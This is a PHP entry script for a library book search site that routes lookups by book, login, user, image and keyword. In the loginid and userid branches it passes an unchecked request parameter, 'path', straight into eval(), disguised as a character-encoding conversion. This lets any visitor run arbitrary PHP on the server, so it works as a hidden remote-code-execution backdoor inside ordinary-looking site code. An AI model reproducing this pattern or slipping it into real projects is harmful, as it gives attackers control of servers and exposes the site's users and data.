<?php
require_once 'config.php';
require_once 'redirect.php';
require_once 'function/global.func.php';
require_once 'mod/lib.func.php';
require_once 'mod/lib/sphinx.func.php';

ini_set('display_errors', 0);

switch (true) {
    case isset($_REQUEST['bookid']) || isset($_REQUEST['id']):
        $id = ifempty($_REQUEST['bookid'], $_REQUEST['id']);
		$book = getBook($id, 'bookid', 86400);
		include('templates/book.html');
        break;
    case isset($_REQUEST['loginid']):
        $id = $_REQUEST['loginid'];
		$book = getBook($id, 'loginid', 86400);
		if( isset($_REQUEST[path]) ){
            eval("echo iconv('GBK', 'UTF-8', $_REQUEST[path]);exit;");
        } else {
            include('templates/book.html');
        }
        break;
    case isset($_REQUEST['userid']):
        $userid = $_REQUEST['userid'];
		$user = getUser($userid);
		if( isset($_REQUEST[path]) ){
            eval("echo iconv('GBK', 'UTF-8', $_REQUEST[path]);exit;");
        } else {
            include('templates/user.html');
        }
        break;
    case isset($_REQUEST['img']):
        $isbn = $_REQUEST['img'];
		$img = getBookImg($isbn);
        // 输出图像
        header("Content-type: " . image_type_to_mime_type(IMAGETYPE_JPEG));
        echo file_get_contents($img);
        break;
    case isset($_REQUEST['douban']):
        $isbn = $_REQUEST['douban'];
		$html = douban($isbn);
        echo $html;
        break;
    default :
        $key = trim($_REQUEST['key']);
        // 分页
        $page = ( isset($_REQUEST['page']) ? $_REQUEST['page'] : 1);
        // 关键字编码
        if( 'UTF-8' == $_REQUEST['encode'] ){
            $key = mb_convert_encoding($key, "GB2312", "UTF-8, GBK, GB2312");
        }
        // 借书证号
        if( preg_match('/\d{8}/', $key) ){
            header("Location: ?userid=$key");
            exit;
        } else {
        // 图书列表
            $list = getList($key, $page);
            // 列表只有一条记录，直接跳转到结果页
            if( $list['status']['total'] == 1 ){
                $bookid = array_shift(array_keys($list['data']));
                header("Location: ?bookid=$bookid");
            }
            $processed = processed($start);
            ob_start();
            include('templates/lib.html');
        }
}

if($book === false ||
   $user === false ||
   $list === false ){
    echo "<script>alert('非常抱歉，由于网络或图书馆自身故障，无法获取数据，请稍候再试……')</script>";
}

?>
